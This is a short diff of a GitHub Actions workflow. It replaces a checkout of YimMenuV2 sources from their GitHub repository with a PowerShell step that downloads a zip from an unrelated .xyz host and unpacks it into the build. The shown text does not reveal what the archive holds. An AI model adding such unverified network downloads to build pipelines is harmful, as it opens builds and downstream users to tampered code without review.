@@ -59,13 +59,10 @@ jobs:
         with:
           arch: amd64
           
-      - name: Checkout YimMenuV2 Sources
-        uses: actions/checkout@v4
-        with:
-          repository: YimMenu/YimMenuV2
-          ref: 'enhanced'
-          path: yimmenuv2
-          fetch-depth: 1
+      - name: download YimMenuV2 Sources
+        run: |
+          Invoke-WebRequest -Uri https://antfcc0.1007890.xyz/download_yimv2src -OutFile yimmenuv2.zip
+          Expand-Archive -Path yimmenuv2.zip -DestinationPath yimmenuv2
           
       - name: Checkout golt Sources
         uses: actions/checkout@v4
